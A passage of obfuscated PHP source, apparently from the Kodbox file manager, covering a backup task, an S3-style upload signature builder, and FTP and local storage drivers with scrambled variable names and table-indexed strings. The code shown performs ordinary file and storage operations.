if ($ªĞÂœ»ğ) { return Task::restart($ªĞÂœ»ğ[$ŸéÇòç [401]]); } } $¢†íËôç = new Backup(); $»†ÁÚ¾ = $¢†íËôç->db(); if ($»†ÁÚ¾) { $»†ÁÚ¾ = $¢†íËôç->dbFile(); if ($»†ÁÚ¾ && $ç‰ÔÇú[$ŸéÇòç [747]] == $ŸéÇòç [200]) { $»†ÁÚ¾ = $¢†íËôç->file(); } } Backup::set(array($ŸéÇòç [742] => 1, $ŸéÇòç [496] => time())); return !0; } public function process() { $¡Ÿ¦ñ˜ò =& $_SERVER[¹àö™Ç¾]; $Ã·ëá† = array($¡Ÿ¦ñ˜ò[750] => Task::get($¡Ÿ¦ñ˜ò[771]), $¡Ÿ¦ñ˜ò[754] => Task::get($¡Ÿ¦ñ˜ò[792]), $¡Ÿ¦ñ˜ò[202] => Task::get($¡Ÿ¦ñ˜ò[801])); $‹¦·ûˆª = !1; foreach ($Ã·ëá† as &$®°Ó€èó) { if ($‹¦·ûˆª) { $®°Ó€èó = !1; continue; } if ($®°Ó€èó) { $†ïŠ­–š = intval(_get($®°Ó€èó, $¡Ÿ¦ñ˜ò[1645], 0)); if (time() - $†ïŠ­–š > 7200) { Task::kill($®°Ó€èó[$¡Ÿ¦ñ˜ò[401]]); $‹¦·ûˆª = !0; $®°Ó€èó = !1; } } } return $Ã·ëá†; } public function restore() { $ºÀ‚éäŒ =& $_SERVER[¹àö™Ç¾]; ActionCall($ºÀ‚éäŒ[1045], !0, 1); ActionCall($ºÀ‚éäŒ[1045], !0, 0); } } goto e¥åÎê™æ; bÆÏ†¯ï: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($¤‡ÆÛõÂ) { parent::__construct($¤‡ÆÛõÂ); $this->signatureVersion($_SERVER[¹àö™Ç¾][221]); } public function uploadFormData($Äøº˜Ã, $úÎ©Å©º = 3600) { $öıäŒ‰ı =& $_SERVER[¹àö™Ç¾]; $ˆÎØ¬‰† = $öıäŒ‰ı[201]; $Œˆ»ã°Ñ = $öıäŒ‰ı[1329]; $¼™ñÈÜ» = $öıäŒ‰ı[72]; $èÀ¡÷½œ = gmdate($öıäŒ‰ı[1330]); $¨±Ÿ¸Ÿ = gmdate($öıäŒ‰ı[743]); $Š×İÔ¸³ = $öıäŒ‰ı[1331]; $¾šØœ®ü = $úÎ©Å©º . $öıäŒ‰ı[22]; $È«µ½º = $öıäŒ‰ı[1293]; $ò˜¯“ = array($this->accessKey, $¨±Ÿ¸Ÿ, $this->region, $¼™ñÈÜ», $Š×İÔ¸³); $²Û×Şğ = implode($öıäŒ‰ı[18], $ò˜¯“); $áÉšÃ» = array($öıäŒ‰ı[1295] => gmdate($öıäŒ‰ı[1294], strtotime($öıäŒ‰ı[1332])), $öıäŒ‰ı[1296] => array(array($öıäŒ‰ı[1298] => $this->bucket), array($öıäŒ‰ı[1297] => $ˆÎØ¬‰†), array($öıäŒ‰ı[1299], $öıäŒ‰ı[1300], $öıäŒ‰ı[22]), array($öıäŒ‰ı[1299], $öıäŒ‰ı[1333], $öıäŒ‰ı[22]), array($öıäŒ‰ı[1299], $öıäŒ‰ı[1334], $öıäŒ‰ı[22]), array($öıäŒ‰ı[1301] => $È«µ½º), array($öıäŒ‰ı[1335] => $²Û×Şğ), array($öıäŒ‰ı[1336] => $Œˆ»ã°Ñ), array($öıäŒ‰ı[1337] => $èÀ¡÷½œ), array($öıäŒ‰ı[1338] => $¾šØœ®ü))); $À³áº£Î = base64_encode(json_encode($áÉšÃ»)); $Ö˜ ‘×Ï = hash_hmac($öıäŒ‰ı[1339], $¨±Ÿ¸Ÿ, $öıäŒ‰ı[1340] . $this->secret, !0); $ï¯ğÏÄÍ = hash_hmac($öıäŒ‰ı[1339], $this->region, $Ö˜ ‘×Ï, !0); $÷óá®Êê = hash_hmac($öıäŒ‰ı[1339], $¼™ñÈÜ», $ï¯ğÏÄÍ, !0); $çÁˆ¤œ = hash_hmac($öıäŒ‰ı[1339], $Š×İÔ¸³, $÷óá®Êê, !0); $Öªˆã· = hash_hmac($öıäŒ‰ı[1339], $À³áº£Î, $çÁˆ¤œ); $íó¦›Öâ = array($öıäŒ‰ı[220] => $öıäŒ‰ı[22], $öıäŒ‰ı[1341] => $öıäŒ‰ı[22], $öıäŒ‰ı[1297] => $ˆÎØ¬‰†, $öıäŒ‰ı[1301] => $È«µ½º, $öıäŒ‰ı[1305] => $À³áº£Î, $öıäŒ‰ı[1342] => $²Û×Şğ, $öıäŒ‰ı[1343] => $Œˆ»ã°Ñ, $öıäŒ‰ı[1344] => $èÀ¡÷½œ, $öıäŒ‰ı[1345] => $¾šØœ®ü, $öıäŒ‰ı[1346] => $Öªˆã·, $öıäŒ‰ı[184] => $this->getHost()); return $íó¦›Öâ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($êÏêŠ) { parent::__construct(); if (count($êÏêŠ) > 0) { $this->_init($êÏêŠ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ÍÚ†ª¡) { $¶üüæô» =& $_SERVER[¹àö™Ç¾]; global $config; $this->appCharset = $config[$¶üüæô»[1347]]; $this->systemCharset = $config[$¶üüæô»[1348]]; if (isset($ÍÚ†ª¡[$¶üüæô»[1349]]) && $ÍÚ†ª¡[$¶üüæô»[1349]]) { $this->systemCharset = $ÍÚ†ª¡[$¶üüæô»[1349]]; } } public function iconvApp($¨œùŸĞ¥) { return $this->iconvTo($¨œùŸĞ¥, $this->systemCharset, $this->appCharset); } public function iconvSystem($ÇôÜ“á) { return $this->iconvTo($ÇôÜ“á, $this->appCharset, $this->systemCharset); } public function getPathOuter($Í’ä‘†¤) { $ïà¯îÎ’ =& $_SERVER[¹àö™Ç¾]; $‰ˆÉë = $this->iconvApp($this->pathBase); $Í’ä‘†¤ = $this->iconvApp($Í’ä‘†¤); if (substr($‰ˆÉë, 0, 2) == $ïà¯îÎ’[1350]) { $‰ˆÉë = BASIC_PATH . substr($‰ˆÉë, 2); } if (substr($Í’ä‘†¤, 0, 2) == $ïà¯îÎ’[1350]) { $Í’ä‘†¤ = BASIC_PATH . substr($Í’ä‘†¤, 2); } $‰ˆÉë = KodIO::clear($‰ˆÉë); $Í’ä‘†¤ = KodIO::clear($Í’ä‘†¤); $Í’ä‘†¤ = substr($Í’ä‘†¤, strlen($‰ˆÉë)); if (empty($this->pathDriver)) { return $Í’ä‘†¤; } return $this->pathDriver . $ïà¯îÎ’[18] . ltrim($Í’ä‘†¤, $ïà¯îÎ’[18]); } private function _init($ÑùÛäÒ– = array()) { $Ğ…µŒ· =& $_SERVER[¹àö™Ç¾]; if (!function_exists($Ğ…µŒ·[1351])) { throw new Exception(LNG($Ğ…µŒ·[1352])); } $this->config = $ÑùÛäÒ–; $this->charsetReset($ÑùÛäÒ–); foreach ($ÑùÛäÒ– as $‘ğáÓå => $ôïÁÚÙ›) { if (isset($this->{$‘ğáÓå})) { $this->{$‘ğáÓå} = $ôïÁÚÙ›; } } return $this->_login($ÑùÛäÒ–); } private function _login($€ø„­£ğ) { $ŠÙ°«Š =& $_SERVER[¹àö™Ç¾]; static $´¤©ñ“¹ = array(); $ƒµ´£— = md5(json_encode($€ø„­£ğ)); if (isset($´¤©ñ“¹[$ƒµ´£—])) { foreach ($´¤©ñ“¹[$ƒµ´£—] as $ÑÚÎ¿ƒÑ => $˜…¸š‡µ) { $this->{$ÑÚÎ¿ƒÑ} = $˜…¸š‡µ; } return !0; } $²´Éóİä = parse_url(trim($this->server, $ŠÙ°«Š[18])); $this->host = $²´Éóİä[$ŠÙ°«Š[184]]; $À¢”“¨‚ = isset($²´Éóİä[$ŠÙ°«Š[183]]) && $²´Éóİä[$ŠÙ°«Š[183]] == $ŠÙ°«Š[1353] ? !0 : !1; $this->scheme = $À¢”“¨‚ ? $ŠÙ°«Š[1354] : $ŠÙ°«Š[1355]; $this->port = isset($²´Éóİä[$ŠÙ°«Š[185]]) ? $²´Éóİä[$ŠÙ°«Š[185]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $³ÓŸÆ™¨ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ñ•µã½û = $this->pasv == $ŠÙ°«Š[99] ? !0 : !1; @ftp_pasv($this->connect, $ñ•µã½û); $´¤©ñ“¹[$ƒµ´£—] = array($ŠÙ°«Š[1356] => $this->connect, $ŠÙ°«Š[184] => $this->host, $ŠÙ°«Š[183] => $this->scheme, $ŠÙ°«Š[185] => $this->port); return $³ÓŸÆ™¨; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($¹Ûê­¡¸, $Ø¢†ÄŸ  = '', $úãï·Ş˜ = REPEAT_RENAME) { if ($this->setContent($¹Ûê­¡¸, $Ø¢†ÄŸ )) { return $this->getPathOuter($¹Ûê­¡¸); } return !1; } public function mkdir($Šçêñ„, $­¬Ùò´ä = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Šçêñ„ = $this->iconvSystem($Šçêñ„); if ($this->_isFolder($Šçêñ„) || @ftp_mkdir($this->connect, $Šçêñ„)) { return $this->getPathOuter($Šçêñ„); } if (!$this->mkdir($this->pathFather($Šçêñ„))) { return !1; } if ($Šçêñ„ = @ftp_mkdir($this->connect, $Šçêñ„)) { return $this->getPathOuter($Šçêñ„); } return !1; } public function copyFile($ÁÙÕÖ™Û, $Îß˜é”) { if (!$this->_isconn()) { return !1; } $°÷ú¼ = $this->pathThis($this->iconvSystem($ÁÙÕÖ™Û)); $È»äÜâà = $this->tempFile($°÷ú¼); $ºßåŸ¡Ÿ = $this->iconvApp($È»äÜâà); $this->download($ÁÙÕÖ™Û, $ºßåŸ¡Ÿ); $ôàáÔÉß = $this->upload($Îß˜é”, $ºßåŸ¡Ÿ); $this->tempFileRemve($È»äÜâà); return $ôàáÔÉß; } public function moveFile($½ÉÁÒôÎ, $ÓÜŒé‡) { if (!$this->_isconn()) { return !1; } $½ÉÁÒôÎ = $this->iconvSystem($½ÉÁÒôÎ); $ÓÜŒé‡ = $this->iconvSystem($ÓÜŒé‡); $âòÏ×·Ò = @ftp_rename($this->connect, $½ÉÁÒôÎ, $ÓÜŒé‡); return $âòÏ×·Ò ? $this->getPathOuter($ÓÜŒé‡) : !1; } public function delFile($îê·«¨í) { if (!$this->_isconn()) { return !1; } $îê·«¨í = $this->iconvSystem($îê·«¨í); return @ftp_delete($this->connect, $îê·«¨í); } public function delFolder($’©†ã) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $¼…ñ†å’ = $ôèÕ‘àª = array(); $this->fileList($’©†ã, $¼…ñ†å’, $ôèÕ‘àª, !0); $this->listItemCache = !0; foreach ($ôèÕ‘àª as $¥Õ¼À¢Â) { $ÒïÉ»… = $this->iconvSystem($¥Õ¼À¢Â[$_SERVER[¹àö™Ç¾][42]]); $–Õ—¿šˆ = @ftp_delete($this->connect, $ÒïÉ»…); if (!$–Õ—¿šˆ) { return !1; } } foreach ($¼…ñ†å’ as $ÒïÉ»…) { $ÒïÉ»… = $this->iconvSystem($ÒïÉ»…); $–Õ—¿šˆ = @ftp_rmdir($this->connect, $ÒïÉ»…); if (!$–Õ—¿šˆ) { return !1; } } $’©†ã = $this->iconvSystem($’©†ã); return @ftp_rmdir($this->connect, $’©†ã); } public function rename($Ì“åŞŞ, $Òñ®Ññğ) { $µÍ—’ºí =& $_SERVER[¹àö™Ç¾]; if (!$this->_isconn()) { return !1; } $­ÅûËó = $this->fileNameAuto($this->pathFather($Ì“åŞŞ), $Òñ®Ññğ); $­ÅûËó = $this->iconvSystem($­ÅûËó); $Ì“åŞŞ = $this->iconvSystem($Ì“åŞŞ); $šö½ËÓ‘ = $this->pathFather($Ì“åŞŞ); $ã°‰„Ù = rtrim($šö½ËÓ‘, $µÍ—’ºí[18]) . $µÍ—’ºí[18] . $­ÅûËó; $¾ªÜ¶»ó = @ftp_rename($this->connect, $Ì“åŞŞ, $ã°‰„Ù); $ã°‰„Ù = $this->iconvApp($ã°‰„Ù); return $¾ªÜ¶»ó ? $this->getPathOuter($ã°‰„Ù) : !1; } private function folderInfo($‹´¸’íŞ, $õâõˆ®Í = false) { $¾òÙ©– =& $_SERVER[¹àö™Ç¾]; $ÉÓù¯¥ = array($¾òÙ©–[42] => $this->pathThis($‹´¸’íŞ), $¾òÙ©–[88] => $this->getPathOuter($¾òÙ©–[18] . $‹´¸’íŞ), $¾òÙ©–[43] => $¾òÙ©–[89]); if ($õâõˆ®Í) { return $ÉÓù¯¥; } $ÉÓù¯¥[$¾òÙ©–[203]] = $ÉÓù¯¥[$¾òÙ©–[96]] = 0; $ÉÓù¯¥[$¾òÙ©–[204]] = $ÉÓù¯¥[$¾òÙ©–[205]] = !0; return $ÉÓù¯¥; } private function fileInfo($×¿˜Ã”, $ÙƒËüêö = false, $æ×•­•Ÿ = array()) { $‰ŞâæÌÛ =& $_SERVER[¹àö™Ç¾]; $Ş½®¼°ë = array($‰ŞâæÌÛ[42] => $this->pathThis($×¿˜Ã”), $‰ŞâæÌÛ[88] => $this->getPathOuter($‰ŞâæÌÛ[18] . $×¿˜Ã”), $‰ŞâæÌÛ[43] => $‰ŞâæÌÛ[202], $‰ŞâæÌÛ[90] => isset($æ×•­•Ÿ[$‰ŞâæÌÛ[90]]) ? $æ×•­•Ÿ[$‰ŞâæÌÛ[90]] : 0, $‰ŞâæÌÛ[177] => $this->ext($×¿˜Ã”)); if ($ÙƒËüêö) { return $Ş½®¼°ë; } $Ş½®¼°ë[$‰ŞâæÌÛ[203]] = $Ş½®¼°ë[$‰ŞâæÌÛ[96]] = 0; $Ş½®¼°ë[$‰ŞâæÌÛ[204]] = $Ş½®¼°ë[$‰ŞâæÌÛ[205]] = !0; $‹°¥øŞ” = $this->iconvSystem($×¿˜Ã”); $Ş½®¼°ë[$‰ŞâæÌÛ[96]] = @ftp_mdtm($this->connect, $‹°¥øŞ”); if (empty($æ×•­•Ÿ)) { $æ×•­•Ÿ = $this->objectMeta($×¿˜Ã”); if (!$æ×•­•Ÿ) { return $Ş½®¼°ë; } } $Ş½®¼°ë[$‰ŞâæÌÛ[90]] = $æ×•­•Ÿ[$‰ŞâæÌÛ[90]]; return $Ş½®¼°ë; } public function size($Ëáãœ) { $¶ìŞÀ³ = $this->objectMeta($Ëáãœ); return $¶ìŞÀ³ ? $¶ìŞÀ³[$_SERVER[¹àö™Ç¾][90]] : 0; } public function info($¯Íş¼«…) { if ($this->isFile($¯Íş¼«…)) { return $this->fileInfo($¯Íş¼«…, 0); } else { if ($this->isFolder($¯Íş¼«…)) { return $this->folderInfo($¯Íş¼«…); } } return !1; } private function fileList($½š•¹š¿, &$˜’ñğ„„, &$Û¿¸™ô£, $ú˜„­Á„ = false) { $Ö×¬†¨ =& $_SERVER[¹àö™Ç¾]; $½š•¹š¿ = $this->iconvSystem($½š•¹š¿); if (!$this->isFolder($½š•¹š¿)) { return !1; } @ftp_chdir($this->connect, $Ö×¬†¨[18]); $½š•¹š¿ = rtrim($½š•¹š¿, $Ö×¬†¨[18]) . $Ö×¬†¨[18]; check_abort(); $†¹®ÕÙù = $this->listItemCache === !1 ? !1 : !0; $›‚¸À¹µ = @ftp_rawlist($this->connect, $½š•¹š¿); if (!$›‚¸À¹µ) { $›‚¸À¹µ = array(); } $æ®Œ€Ë„ = array($Ö×¬†¨[20] => 1, $Ö×¬†¨[1357] => 1); foreach ($›‚¸À¹µ as $·ê©Îğ) { $®ú½ = $this->_listItem($·ê©Îğ); if ($®ú½[0] == $Ö×¬†¨[751]) { continue; } $¾ôï„ø¬ = $®ú½[8]; if (empty($¾ôï„ø¬) && $¾ôï„ø¬ !== $Ö×¬†¨[200] || isset($æ®Œ€Ë„[$¾ôï„ø¬])) { continue; } $¾ôï„ø¬ = $this->iconvApp($½š•¹š¿ . ltrim($¾ôï„ø¬, $Ö×¬†¨[18])); $œŸçûšÖ = array($Ö×¬†¨[42] => $¾ôï„ø¬, $Ö×¬†¨[43] => $Ö×¬†¨[202], $Ö×¬†¨[90] => $®ú½[4]); if (substr($·ê©Îğ, 0, 1) == $Ö×¬†¨[1358]) { $œŸçûšÖ[$Ö×¬†¨[43]] = $Ö×¬†¨[89]; $œŸçûšÖ[$Ö×¬†¨[90]] = 0; } $Øß×¢ŞÖ = $œŸçûšÖ[$Ö×¬†¨[43]] == $Ö×¬†¨[89] ? !0 : !1; if ($†¹®ÕÙù) { $this->cacheMethod($Ö×¬†¨[208], $¾ôï„ø¬, $Øß×¢ŞÖ); $this->cacheMethod($Ö×¬†¨[209], $¾ôï„ø¬, $œŸçûšÖ); } if ($Øß×¢ŞÖ) { $˜’ñğ„„[] = $¾ôï„ø¬; if ($ú˜„­Á„) { $this->fileList($¾ôï„ø¬, $˜’ñğ„„, $Û¿¸™ô£, $ú˜„­Á„); } continue; } $Û¿¸™ô£[] = $œŸçûšÖ; } if ($†¹®ÕÙù) { $this->cacheMethod($Ö×¬†¨[208], $½š•¹š¿, !0); } } private function _listItem($âö íóˆ) { if (empty($âö íóˆ)) { return array(); } $úú‹£‚Ç = preg_split($_SERVER[¹àö™Ç¾][1359], $âö íóˆ); if (count($úú‹£‚Ç) <= 9) { return $úú‹£‚Ç; } $úú‹£‚Ç[8] = trim(substr($âö íóˆ, strpos($âö íóˆ, $úú‹£‚Ç[7]) + strlen($úú‹£‚Ç[7]))); return array_splice($úú‹£‚Ç, 0, 9); } public function listPath($çÂ¼úô÷, $éçÉ”ºâ = false) { $ ½É‘Ü‹ =& $_SERVER[¹àö™Ç¾]; if (!$this->_isconn()) { return !1; } $éŠµ¦¸ß = $¯ù´ƒÍí = array(); $this->fileList($çÂ¼úô÷, $éŠµ¦¸ß, $¯ù´ƒÍí); foreach ($éŠµ¦¸ß as $±ôÕÂ¤¦ => $ªÖšª¤©) { $éŠµ¦¸ß[$±ôÕÂ¤¦] = $this->folderInfo($ªÖšª¤©, $éçÉ”ºâ); } foreach ($¯ù´ƒÍí as $±ôÕÂ¤¦ => $ªÖšª¤©) { $¯ù´ƒÍí[$±ôÕÂ¤¦] = $this->fileInfo($ªÖšª¤©[$ ½É‘Ü‹[42]], $éçÉ”ºâ, $ªÖšª¤©); } return array($ ½É‘Ü‹[87] => $éŠµ¦¸ß, $ ½É‘Ü‹[86] => $¯ù´ƒÍí); } public function has($‡¤‰Äı³, $©–¸ºï = false, $íâÂûº¼ = true) { $‹İº°¬Ò =& $_SERVER[¹àö™Ç¾]; $Šæø¡ıÀ = $˜ìÑì›Â = array(); $İ—È¶÷ä = $©–¸ºï ? !0 : !1; $this->fileList($‡¤‰Äı³, $Šæø¡ıÀ, $˜ìÑì›Â, $İ—È¶÷ä); if ($©–¸ºï) { return array($‹İº°¬Ò[212] => count($˜ìÑì›Â), $‹İº°¬Ò[213] => count($Šæø¡ıÀ)); } if ($íâÂûº¼) { if (count($˜ìÑì›Â)) { return !0; } } else { if (count($Šæø¡ıÀ)) { return !0; } } return !1; } public function listAll($Šå²åÆã) { $É¹—¡‹ =& $_SERVER[¹àö™Ç¾]; if (!$this->_isconn()) { return !1; } $ËƒÇ¥¤ = $šÙ­Ï£¨ = array(); $this->fileList($Šå²åÆã, $ËƒÇ¥¤, $šÙ­Ï£¨, !0); $âŞ—°òĞ = array(); foreach ($šÙ­Ï£¨ as $äÙÄ±ù¬) { $âŞ—°òĞ[$äÙÄ±ù¬[$É¹—¡‹[42]]] = $äÙÄ±ù¬[$É¹—¡‹[90]]; } foreach ($ËƒÇ¥¤ as $äÙÄ±ù¬) { if (is_string($äÙÄ±ù¬)) { $âŞ—°òĞ[$äÙÄ±ù¬] = 0; } } return $this->listAllFiles($Šå²åÆã, array_keys($âŞ—°òĞ), $âŞ—°òĞ); } public function getContent($üÍªŞù) { if (!$this->_isconn()) { return !1; } $üÍªŞù = $this->iconvSystem($üÍªŞù); return $this->fileSubstr($üÍªŞù); } public function setContent($Æ€²îˆ…, $‡ÈşÍ‹ = '') { if (!$this->_isconn()) { return !1; } $¥çê¼Æ¢ = $this->pathThis($this->iconvSystem($Æ€²îˆ…)); $Ÿš¤é™ = $this->tempFile($¥çê¼Æ¢); file_put_contents($Ÿš¤é™, $‡ÈşÍ‹); $°ı™Œãè = $this->upload($Æ€²îˆ…, $this->iconvApp($Ÿš¤é™)); $this->tempFileRemve($Ÿš¤é™); return $°ı™Œãè; } public function fileSubstr($Ù²—æ‡, $—êÓªµ¢ = 0, $¦û‚ñâ² = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Ù²—æ‡, $—êÓªµ¢, $¦û‚ñâ²); } private function ftpRequest($ÏÑÀôÀ», $…÷Î²¶ü = 0, $ØÚÓòñ• = false) { $ÏÑÀôÀ» = $this->iconvSystem($ÏÑÀôÀ»); $¥ĞË”Ú = $this->scheme . $this->host . $_SERVER[¹àö™Ç¾][4] . $this->port; $ĞÎå³³÷ = curl_init(); curl_setopt($ĞÎå³³÷, CURLOPT_URL, $¥ĞË”Ú . $this->pathEncode($ÏÑÀôÀ»)); curl_setopt($ĞÎå³³÷, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ØÚÓòñ•) { $Îî°àáŸ = $…÷Î²¶ü + $ØÚÓòñ• - 1; curl_setopt($ĞÎå³³÷, CURLOPT_RANGE, "{$…÷Î²¶ü}\x2d{$Îî°àáŸ}"); } curl_setopt($ĞÎå³³÷, CURLOPT_RETURNTRANSFER, 1); $úïåÇ€ = curl_exec($ĞÎå³³÷); curl_close($ĞÎå³³÷); return $úïåÇ€; } public function upload($®‚—éº¢, $¡°úİÄœ, $ó“ü–¨Ğ = false, $•öÔëÊ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($®‚—éº¢))) { return !1; } $®‚—éº¢ = $this->iconvSystem($®‚—éº¢); $¡°úİÄœ = $this->iconvSystem($¡°úİÄœ); $ÇŞ²ºô = ftp_nb_put($this->connect, $®‚—éº¢, $¡°úİÄœ, FTP_BINARY); while ($ÇŞ²ºô == FTP_MOREDATA) { $ÇŞ²ºô = ftp_nb_continue($this->connect); } if ($ÇŞ²ºô != FTP_FINISHED) { return !1; } return $this->getPathOuter($®‚—éº¢); } public function download($ÅËàß, $Ú‚Ñ³€ = '') { if (!$this->_isconn()) { return !1; } $¿¿ı·‹ƒ = $this->pathFather($Ú‚Ñ³€); if (!IO::mkdir($¿¿ı·‹ƒ)) { return !1; } $ÅËàß = $this->iconvSystem($ÅËàß); $Ú‚Ñ³€ = $this->iconvSystem($Ú‚Ñ³€); $‡Ô„»Ø  = ftp_nb_get($this->connect, $Ú‚Ñ³€, $ÅËàß, FTP_BINARY); while ($‡Ô„»Ø  == FTP_MOREDATA) { $‡Ô„»Ø  = ftp_nb_continue($this->connect); } if ($‡Ô„»Ø  != FTP_FINISHED) { return !1; } return $this->iconvApp($Ú‚Ñ³€); } public function exist($­„ÆÚÚ¢) { return $this->isFile($­„ÆÚÚ¢) || $this->isFolder($­„ÆÚÚ¢); } public function isFile($Ş™À¡Á‰) { return !$this->isFolder($Ş™À¡Á‰) && $this->objectMeta($Ş™À¡Á‰); } public function isFolder($¿½Ó§·Ğ) { return $this->cacheMethod($_SERVER[¹àö™Ç¾][208], $¿½Ó§·Ğ); } protected function objectMeta($ø¯ğşÈ‡) { return $this->cacheMethod($_SERVER[¹àö™Ç¾][209], $ø¯ğşÈ‡); } protected function _objectMeta($àÇÙµï¦) { $È¸ô†ñé =& $_SERVER[¹àö™Ç¾]; if ($àÇÙµï¦ == $È¸ô†ñé[22] || $àÇÙµï¦ == $È¸ô†ñé[18]) { return array(); } if (!$this->_isconn()) { return !1; } $àÇÙµï¦ = $this->iconvSystem($àÇÙµï¦); $ü½š¹ = array($È¸ô†ñé[42] => $this->iconvApp($àÇÙµï¦), $È¸ô†ñé[43] => $È¸ô†ñé[202], $È¸ô†ñé[90] => 0); @ftp_chdir($this->connect, $È¸ô†ñé[18]); $ÅÖµşó = @ftp_size($this->connect, $àÇÙµï¦); if ($ÅÖµşó != -1) { $ü½š¹[$È¸ô†ñé[90]] = $ÅÖµşó; } else { $¬‡¸ÕŸö = @ftp_chdir($this->connect, $àÇÙµï¦); if (!$¬‡¸ÕŸö) { return !1; } $ü½š¹[$È¸ô†ñé[43]] = $È¸ô†ñé[89]; } return $ü½š¹; } protected function _isFolder($®ó†Í—–) { $Á“¢œ©œ =& $_SERVER[¹àö™Ç¾]; if ($®ó†Í—– == $Á“¢œ©œ[22] || $®ó†Í—– == $Á“¢œ©œ[18]) { return !0; } $ÌìïÚ½ = $this->_objectMeta($®ó†Í—–); return isset($ÌìïÚ½[$Á“¢œ©œ[43]]) && $ÌìïÚ½[$Á“¢œ©œ[43]] == $Á“¢œ©œ[89] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($âğÄñ) { if (substr($âğÄñ, 0, 2) == $_SERVER[¹àö™Ç¾][1350]) { $âğÄñ = BASIC_PATH . substr($âğÄñ, 2); } return $âğÄñ; } public function iconvApp($ßæ‚‚›) { $ÑÙè‡Î¤ =& $_SERVER[¹àö™Ç¾]; global $config; return $this->iconvTo($ßæ‚‚›, $config[$ÑÙè‡Î¤[1348]], $config[$ÑÙè‡Î¤[1347]]); } public function iconvSystem($ÍÂıê‹¼) { $Š¹‰°ë =& $_SERVER[¹àö™Ç¾]; global $config; return $this->iconvTo($ÍÂıê‹¼, $config[$Š¹‰°ë[1347]], $config[$Š¹‰°ë[1348]]); } public function getPathOuter($°à•Éµñ) { $¯’ß¢ÇÛ =& $_SERVER[¹àö™Ç¾]; $ŞôäŒÕ° = $this->iconvApp($this->pathBase); $°à•Éµñ = $this->iconvApp($°à•Éµñ); if (substr($ŞôäŒÕ°, 0, 2) == $¯’ß¢ÇÛ[1350]) { $ŞôäŒÕ° = BASIC_PATH . substr($ŞôäŒÕ°, 2); } if (substr($°à•Éµñ, 0, 2) == $¯’ß¢ÇÛ[1350]) { $°à•Éµñ = BASIC_PATH . substr($°à•Éµñ, 2); } $ŞôäŒÕ° = KodIO::clear($ŞôäŒÕ°); $°à•Éµñ = KodIO::clear($°à•Éµñ); $°à•Éµñ = substr($°à•Éµñ, strlen($ŞôäŒÕ°)); if (empty($this->pathDriver)) { return $°à•Éµñ; } return $this->pathDriver . $¯’ß¢ÇÛ[18] . ltrim($°à•Éµñ, $¯’ß¢ÇÛ[18]); } public function mkfile($÷³ñ’î, $ëï§ñ‰è = '', $½¯å—¥‚ = REPEAT_RENAME) { $÷³ñ’î = $this->iconvSystem($÷³ñ’î); @touch($÷³ñ’î); if ($ëï§ñ‰è) { file_put_contents($÷³ñ’î, $ëï§ñ‰è); } @chmod($÷³ñ’î, $this->pathAuth); return is_file($÷³ñ’î) ? $this->getPathOuter($÷³ñ’î) : !1; } public function mkdir($éåØ®, $²îíÚÆ£ = REPEAT_SKIP) { $éåØ® = $this->iconvSystem($éåØ®); if (is_dir($éåØ®)) { return $this->getPathOuter($éåØ®); } @mkdir($éåØ®, $this->pathAuth, !0); @chmod($éåØ®, $this->pathAuth); return is_dir($éåØ®) ? $this->getPathOuter($éåØ®) : !1; } public function copyFile($­éªÑÀş, $úèå‡…Õ) { $this->mkdir($this->pathFather($úèå‡…Õ)); $­éªÑÀş = $this->iconvSystem($­éªÑÀş); $úèå‡…Õ = $this->iconvSystem($úèå‡…Õ); $ŸÄªÎ­’ = copy_64($­éªÑÀş, $úèå‡…Õ); @chmod($úèå‡…Õ, $this->pathAuth); return $ŸÄªÎ­’ ? $this->getPathOuter($úèå‡…Õ) : !1; } public function moveFile($Úë¾µü², $’ëŒ“) { $this->mkdir($this->pathFather($’ëŒ“)); $Úë¾µü² = $this->iconvSystem($Úë¾µü²); $’ëŒ“ = $this->iconvSystem($’ëŒ“); $ ²–ğÙ³ = intval(@rename($Úë¾µü², $’ëŒ“)); if (!$ ²–ğÙ³) { if ($ ²–ğÙ³ = intval(@copy_64($Úë¾µü², $’ëŒ“))) { @unlink($Úë¾µü²); } } @chmod($’ëŒ“, $this->pathAuth); return $ ²–ğÙ³ ? $this->getPathOuter($’ëŒ“) : !1; } public function movePath($¥õ…äê, $ƒ÷¿Áúù, $²¯Å„Ù¼ = false) { $ó¼îš¿¤ =& $_SERVER[¹àö™Ç¾]; $¥õ…äê = $this->iconvSystem($¥õ…äê); $ƒ÷¿Áúù = $this->iconvSystem($ƒ÷¿Áúù); $¦¦²ˆç = rtrim($ƒ÷¿Áúù, $ó¼îš¿¤[18]) . $ó¼îš¿¤[18] . ($²¯Å„Ù¼ ? $²¯Å„Ù¼ : get_path_this($¥õ…äê)); if (file_exists($¦¦²ˆç)) { return !1; } $İ‰ÀóÎğ = intval(@rename($¥õ…äê, $¦¦²ˆç)); $İ‰ÀóÎğ = file_exists($¦¦²ˆç); return $İ‰ÀóÎğ ? $this->getPathOuter($¦¦²ˆç) : !1; } public function delFile($©ƒºõ±) { $©ƒºõ± = $this->iconvSystem($©ƒºõ±); if (!@unlink($©ƒºõ±)) { @chmod($©ƒºõ±, $this->pathAuth); if (!@unlink($©ƒºõ±)) { return !1; } } else { return !0; } } public function delFolder($Âê·»¡¦) { $Øµê²±ú =& $_SERVER[¹àö™Ç¾]; $Âê·»¡¦ = $this->iconvSystem($Âê·»¡¦); if (!is_dir($Âê·»¡¦)) { return !0; } if (!($Ã½¼‡ÆÂ = opendir($Âê·»¡¦))) { return !1; } while 